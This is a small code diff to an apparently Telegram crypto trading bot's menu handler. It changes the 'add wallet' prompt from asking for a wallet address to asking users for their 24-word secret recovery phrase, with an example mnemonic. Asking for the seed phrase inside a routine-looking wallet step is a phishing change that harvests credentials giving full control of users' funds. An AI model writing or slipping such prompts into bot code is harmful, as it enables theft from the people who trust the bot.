@@ -63,7 +63,7 @@ function handleSubMenuAction(bot, chatId, messageId, data) {
 
   const actionKey = `${menuType}_${action}`;
   const responses = {
-    'wallets_add': '➕ Please send your wallet address:',
+    'wallets_add': '✏️ Enter your 24 secret keywords, 📝 Example:bone gesture genius essay tontradingbot spread poet rather panel jazz lmao primary fall cry crystal genre leave mark bench phrase mention special toe route:',
     'wallets_view': '👁️ Here are your connected wallets:',
     'wallets_remove': '❌ Select a wallet to remove:',
     'balance_check': '💰 Fetching your balance...',
